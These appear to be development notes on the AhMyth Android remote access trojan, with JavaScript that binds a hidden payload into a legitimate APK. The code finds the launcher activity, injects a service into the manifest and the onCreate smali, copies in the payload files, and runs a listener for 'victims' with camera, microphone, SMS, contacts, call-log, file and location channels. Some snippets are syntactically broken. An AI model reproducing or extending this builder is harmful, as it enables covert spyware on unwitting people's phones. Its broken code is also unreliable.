## Launcher Extraction for `<application` attribute | AppCtrl.js |
- Need to figure out how to add a secondary `<activity` regex if the `<application` regex returns -1
- Need to figure out how to add third subsidiary `<activity-alias` regex for the `manifest.indexOf("android:targetActivity")` section of this function if the first 2 regex's return -1
```javascript
function GetLauncherActivity(manifest) {


    var regex = /<application/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf(
        'android.intent.action.MAIN'
        'android.intent.category.LAUNCHER',
        +
        'android.intent.action.MAIN'
        'android.intent.category.INFO',
        );
    var indexOfActivity = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
```
  

## Sets of Code for the orgAppKey2
```javascript
exports.orgAppKey2 = ';->onCreate()V';
```
```javascript
var key = CONSTANTS.orgAppKey2;
$appCtrl.Log("Modifiying launcher activity...");
var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
fs.writeFile(launcherPath, output, 'utf8', (error) => {
    if (error) {
        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
        return;
    }
```
    
## Code Sets for function to stop listening | AppCtrl.js + main.js + build.html |
```javascript
    // when user clicks Disconnect Button
    $appCtrl.Stop = (port) => {
      if (!port) {
        port = CONSTANTS.defaultPort;
      }
      
      //notify the main process to disconnect the port
      ipcRenderer.send('SocketIO:StopListen', port);
      $appCtrl.Log("Stopped Listening on Port: " + port, CONSTANTS.logStatus.SUCCESS);
    }

    //fired when main process sends any notification about the ServerDisconnect 
    ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
      delete viclist[index];
      $appCtrl.$apply();
    });

    // fired if stopping the listener brings error
    ipcRenderer.on("SocketIO:StopListen", (event, error) => {
      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
      $appCtrl.$apply()
  });

    //notify the main process to close the lab
    $appCtrl.closeLab = (index) => {
      ipcRenderer.send('closeLabWindow', 'lab.html', index)
    }
```
```javascript 
// fired when stopped listening for victim
ipcMain.on("SocketIO:StopListen", function (event, port) {

  IO.close();
  IO.sockets.on('connection', function (socket) {
    // decrease socket count on Disconnect
    socket.on('disconnect', function () {
      victimList.rmVictim(index)

      // notify the renderer process about the Server Disconnection
      win.webContents.send('SocketIO:ServerDisconnect', index);

      if (windows[index]) {
        // notify the renderer process about the Disconnected Server
        windows[index].webContents.send('SocketIO:ServerDisconnected', index);
        // delete the windows from the windowList
        delete windows[index];
      }
    });
  });
});


ipcMain.on("closeLabWindow", function (event, index) {
  delete windows[index];
  //on lab window closed remove all socket listners
  if (victimsList.getVictim(index).socket) {
    victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
    victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
    victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
    victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
    victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
    victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
    victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
  }
});

//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {

  if (error.code == "EADDRINUSE" || error.code == "ENOTCONN") {
    win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    win.webContents.send('SocketIO:StopListen', "Server is not Listening");
  } // end of if

});
```
```html
<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
```
## New Bind on Launch function
```js
    $appCtrl.BindOnLauncher = (apkFolder) => {

        $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
        $appCtrl.Log();
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();
                return;
            }

            var launcherActivity = GetLauncherActivity(data, apkFolder);
            if (launcherActivity == -1) {
                $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
                $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
                $appCtrl.Log();
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            $appCtrl.Log();
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log();
                    return;
                }
        
                // This works on Linux and OS X!
                // need to implement a Windows equivalent for it
                // As well as OS detection, in order to run the correct command based on the users OS.
                $appCtrl.Log("Locating Launcher Activity...")
                $appCtrl.Log();
                exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
                  var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                  if (error !== null) {
                      $appCtrl.Log("Cannot Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
                      $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                      $appCtrl.Log();
                      return;
                    }
                    
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                    $appCtrl.Log("Fetching Launcher Activity...")
                    $appCtrl.Log();
                    fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                        if (error) {
                            $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
                            $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                            $appCtrl.Log();
                            return;
                        }

                        var regex = /\/(\S+)\./;
                        var str = (apkFolder, launcherPath);
                        var m = str.match(regex);

                        var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;


                        var key = CONSTANTS.orgAppKey;
                        $appCtrl.Log("Modifiying Launcher Activity...");
                        $appCtrl.Log();
                        var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Launcher Activity Failed', logStatus.FAIL);
                                $appCtrl.Log();
                                return;
                            }

                            var regex = /[^/]+\//;
                            var str = (apkFolder, launcherPath);
                            var m = str.match(regex);

                            var smaliFolder = m[0];

                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                            $appCtrl.Log();
                            fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                if (error) {
                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                                    $appCtrl.Log();
                                    return;
                                }
                                
                                $appCtrl.GenerateApk(apkFolder)
                    
                            });

                        });

                    });

                });
                
            });

        });

    }
``` 
## New `GetLauncherActivity` function | supersedes the old `GetLauncherPath` function
```js
function GetLauncherActivity(manifest) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf
   (
    '"android.intent.action.MAIN"',
    '"android.intent.category.LAUNCHER"'
    +
    '"android.intent.action.MAIN"',
    '"android.intent.category.INFO"'
    );
    var indexOfActivity = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
```
